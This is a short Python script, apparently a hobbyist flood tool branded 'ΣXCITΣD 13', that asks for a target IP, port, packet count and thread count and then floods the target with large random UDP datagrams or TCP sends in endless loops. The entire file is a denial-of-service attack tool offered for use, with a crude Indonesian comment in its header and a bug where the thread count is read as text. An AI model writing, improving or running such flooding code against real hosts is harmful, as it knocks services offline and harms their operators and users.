#AUTHOR BY ΣXCITΣD 13
#GakUsahLuRenameKontol
import random
import socket
import threading
import os
import sys

os.system("clear")

print("""\033[1;31;40m


████████████████████████████████████████
█▄─▄▄─█▄─▀─▄█─▄▄▄─█▄─▄█─▄─▄─█▄─▄▄─█▄─▄▄▀█
██─▄█▀██▀─▀██─███▀██─████─████─▄█▀██─██─█
▀▄▄▄▄▄▀▄▄█▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▀▀""")

print("========= ΣXCITΣD 13 ========")
print("=== AUTHOR BY : ΣXCITΣD 13 ===")
print("===========  V1.0  ===========")

ip = str(input(" IP :")) 
port = int(input(" Port :"))
choice = str(input(" GAS? [Y/N] :")) 
times = int(input(" PACKETS :")) 
threads = str(input(" THREADS :")) 
def run():
  data = random._urandom(102498)
  i = random.choice(("[+]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"ΣXCITΣD ₳₮₮₳₵₭")
    except:
      print("DOWN!!!")

def run2():
  data = random._urandom(102498)
  i = random.choice(("[+]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" ΣXCITΣD!!!")
    except:
      s.close()
      print("[*] Error")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()